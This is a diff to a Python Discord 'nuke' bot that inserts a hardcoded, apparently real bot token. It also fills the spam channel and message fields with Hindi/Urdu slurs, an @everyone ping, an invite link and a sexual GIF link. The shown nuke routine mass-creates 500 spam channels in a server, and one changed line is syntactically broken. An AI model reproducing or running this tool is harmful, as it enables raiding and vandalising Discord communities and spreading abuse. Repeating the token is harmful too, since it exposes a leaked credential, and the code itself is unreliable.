@@ -5,11 +5,11 @@ from discord import Permissions
 from colorama import Fore, Style
 import asyncio
 
-token = "YOUR_TOKEN"
+token = "ODgyOTExMTM0NzM3MzkxNjQ2.YTCREg.vd_V5FCXXoHujY44J-ZkLvHGTUI"
 
 
-SPAM_CHANNEL =  ["TEXT_OF_SPAMMED_CHANNELS"]
-SPAM_MESSAGE = ["@everyone SPAMMED_TEXT"]
+SPAM_CHANNEL =  ["MALAY TUMHARA BAAP RANDI "]
+SPAM_MESSAGE = ["@everyone MALAY SE PANGA NHI LENA THA RANDI K PILLO AB MARO BHDVO discord.gg/jkop https://tenor.com/view/your-mom-hump-sex-fuck-gif-15403435"]
 
 client = commands.Bot(command_prefix="!")
 
@@ -27,7 +27,7 @@ async def on_ready():
 
 Support Server: https://discord.gg/MhE25AhrjQ or VolvoRaggarN#4494
  ''')
-   await client.change_presence(activity=discord.Game(name="BOTS_DESCRIPTION"))
+   await client.change_presence(activity=discord.Game(name="MALAY OP BOLTE"))
 
 @client.command()
 @commands.is_owner()
@@ -83,7 +83,7 @@ async def nuke(ctx):
         print(f"New Invite: {link}")
     amount = 500
     for i in range(amount):
-       await guild.create_text_channel(random.choice(SPAM_CHANNEL))
+       await guild.create_text_channel(random.choice(MALAY PAPA BOLTE))
     print(f"nuked {guild.name} Successfully.")
     return
 
